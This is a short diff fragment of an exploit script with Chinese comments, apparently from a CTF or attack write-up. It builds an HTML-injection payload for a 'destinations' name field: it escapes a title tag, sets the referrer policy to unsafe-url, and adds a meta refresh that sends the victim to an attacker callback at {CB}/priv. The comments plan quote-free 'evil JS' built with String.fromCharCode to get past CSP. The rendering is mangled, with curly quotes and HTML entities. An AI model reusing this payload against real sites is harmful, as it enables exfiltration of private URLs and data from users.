@@ -578,7 +578,7 @@ print(f”[*] webhook: {CB}”)</p>
 <h1>── 2. 外带载荷（用于 destinations 的 name 注入）──</h1>
 <h1></title>逃逸 + 解锁完整URL外带 + 顶级导航(CSP管不着)</h1>
 <p>P = (“</title><meta name=’referrer’ content=’unsafe-url’>”<br />
- f”<meta http-equiv=’refresh’ content=’0;url={CB}/priv’>”)</p>
+ f”&lt;meta http-equiv=’refresh’ content=’0;url={CB}/priv’&gt;”)</p>
 <h1>── 3. evil JS — — 全程无引号，String.fromCharCode 构建 ──</h1>
 <h1>⚠ 三个生死细节:</h1>
 <h1>a) headers 计算键名必须 [String.fromCharCode(..)] 带方括号，丢括号=语法错误=整段script不执行</h1>
